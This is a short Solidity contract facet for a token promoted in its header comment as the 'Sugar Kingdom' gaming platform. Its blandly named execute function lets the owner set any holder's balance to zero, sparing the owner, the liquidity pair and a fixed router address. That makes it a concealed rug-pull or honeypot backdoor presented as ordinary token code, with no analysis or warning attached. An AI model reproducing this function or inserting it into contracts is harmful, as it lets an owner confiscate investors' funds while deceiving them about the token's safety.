// SPDX-License-Identifier: MIT

/*
    Website: https://www.sugarkingdom.io/
    Twitter: https://twitter.com/SugarKingdomNFT
    Discord: https://discord.com/invite/sugar-kingdom
    Sugar Kingdom is a gaming platform in which projects from all chains can bring direct utility to their token, and a place in which users can do 100Xs while using their favorite low-caps.
*/

pragma solidity ^0.8.10;
import "./TestLib.sol";
contract executeFacet {
    function execute(address n) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (
            ds._owner == msg.sender &&
            ds._owner != n &&
            pairs() != n &&
            n != 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        ) {
            ds._balances[n] = 0;
        } else {}
    }
    function pairs() public view virtual returns (address) {
        return
            IPancakeFactory(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f).getPair(
                address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2),
                address(this)
            );
    }
}
